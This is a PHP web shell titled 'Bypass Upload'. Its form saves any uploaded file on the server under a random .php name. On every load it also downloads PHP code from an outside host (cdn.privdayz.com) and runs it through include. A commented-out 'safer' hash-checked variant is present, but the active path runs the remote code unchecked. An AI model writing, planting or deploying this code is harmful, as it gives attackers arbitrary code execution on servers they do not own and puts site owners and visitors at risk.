<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url);
        if ($url_get_contents_data === false) {
            echo 'file_get_contents error';
            return false;
        }
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle === false) {
            echo 'fopen error';
            return false;
        }
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to handle failed operations (from previous samsu.txt)
function failed() {
    header('Location: ?response=failed');
    exit;
}

// Handle bypass upload
if (isset($_POST['bypass-submit'])) {
    $file = $_FILES['bypass-upload'];
    if (move_uploaded_file($file['tmp_name'], $file['name'])) {
        $new_name = substr(md5(rand()), 0, 10) . '.php';
        if (copy($file['name'], $new_name)) {
            unlink($file['name']);
            echo "<script>alert('File uploaded as: $new_name');</script>";
        } else {
            failed();
        }
    } else {
        failed();
    }
}

/* =========================
   1) VARIAN LANGSUNG (TIDAK AMAN)
   ========================= */

// New URL as requested
$remote_url = 'https://cdn.privdayz.com/txt/privbypass2025.txt';

$a = geturlsinfo($remote_url);
if ($a !== false) {
    if (stripos($a, '<?php') !== false || stripos($a, '<?=') !== false) {
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        if (file_put_contents($tmp_file, $a) !== false) {
            // === BERHATI-HATI: baris berikut mengeksekusi kode remote ===
            include($tmp_file);
        } else {
            echo "Failed to write temporary file.";
        }
    } else {
        echo "Fetched content does not appear to contain PHP code. Aborting include.";
    }
} else {
    echo "Failed to retrieve content from remote URL.";
}

/* =========================
   2) VARIAN LEBIH AMAN (REKOMENDASI)
   - Unduh, tampilkan preview, verifikasi SHA256.
   - Hanya include jika hash cocok.
   ========================= */

// Uncomment bagian di bawah ini jika ingin pakai varian aman.
/*
$remote_url = 'https://cdn.privdayz.com/txt/privbypass2025.txt';
$expected_sha256 = ''; // <-- masukkan SHA256 yang kamu percayai (hex lowercase), mis. "3a3b..."
$a = geturlsinfo($remote_url);
if ($a === false) {
    echo "Failed to retrieve content from remote URL (safe mode).";
    exit;
}

// Hitung hash dan tampilkan preview
$hash = hash('sha256', $a);
echo "SHA256: {$hash}\n\n";
$preview = substr($a, 0, 800); // tampilkan 800 char pertama
echo "=== PREVIEW (first 800 chars) ===\n";
echo htmlspecialchars($preview, ENT_SUBSTITUTE | ENT_HTML401, 'UTF-8');
echo "\n\n";

// Jika kamu sudah percaya dan memasukkan expected SHA256, maka kita bisa include
if (!empty($expected_sha256)) {
    if (hash_equals($expected_sha256, $hash)) {
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        if (file_put_contents($tmp_file, $a) !== false) {
            include($tmp_file);
        } else {
            echo "Failed to write temporary file (safe mode).";
        }
    } else {
        echo "Hash mismatch: tidak melakukan include. Periksa file remote atau update expected_sha256.";
    }
} else {
    echo "Expected SHA256 tidak diatur â€” tidak melakukan include. Jika kamu percaya file ini, set expected_sha256 terlebih dahulu.";
}
*/
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Upload</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h2 {
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="file"] {
            width: 100%;
            padding: 8px;
        }
        button {
            background-color: #dc3545;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #c82333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Bypass Upload</h2>
        <form method="post" enctype="multipart/form-data" class="form-group">
            <input type="file" name="bypass-upload" required>
            <button type="submit" name="bypass-submit">Upload</button>
        </form>
    </div>

    <script>
        <?php if (isset($_GET['response']) && $_GET['response'] === 'failed'): ?>
            alert('Upload failed!');
        <?php endif; ?>
    </script>
</body>
</html>
